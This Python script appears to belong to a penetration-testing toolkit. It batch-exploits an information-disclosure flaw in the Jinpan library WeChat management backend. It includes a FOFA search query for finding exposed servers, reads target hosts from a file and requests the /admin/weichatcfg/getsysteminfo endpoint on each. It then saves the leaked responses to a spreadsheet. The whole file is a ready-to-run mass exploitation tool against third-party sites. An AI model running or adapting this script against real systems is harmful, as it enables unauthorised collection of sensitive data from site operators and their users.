

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import tools.GlobalTool as Tool
import tools.HttpTool as NetWork


def help():
    print('''
    fofa: title="微信管理后台" && icon_hash="116323821"
        1. 金盘图书馆微信管理后台信息泄露漏洞, 批量测试, 后台地址url/admin
    x. 退出
    ''')

def vul_download(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
    }
    body = ''
    method = "GET"
    path = "/admin/weichatcfg/getsysteminfo"
    notes = ""
    return (url, method, headers, body, path, notes)


def run():
    OUTDIR = "result/金盘"
    # 获取当前日期和时间
    formatted_datetime = Tool.getime()
    # 获取资产目标
    file = "dat.txt"
    li = Tool.read_host_file(file)
    Tool.mkdir(OUTDIR)
    help()
    num = int(input("执行的指令: "))

    if num == 1:
        data = []
        for url in li:
            item = vul_download(url)
            data.append(item)
        s = NetWork.HttpTool()
        y = s.async_httpx_start(data)

        res = []
        for k, v in y.items():
            res.append(v[:-2])
        ti = ['地址', '状态码', '标题', '请求体', '状态', 'ip', 'port', 'ip_port', '备注']
        Tool.write_to_xlsx(ti, res, f"{OUTDIR}/{formatted_datetime}金盘图书馆微信管理后台信息泄露漏洞.xlsx")

    else:
        print('bye..')
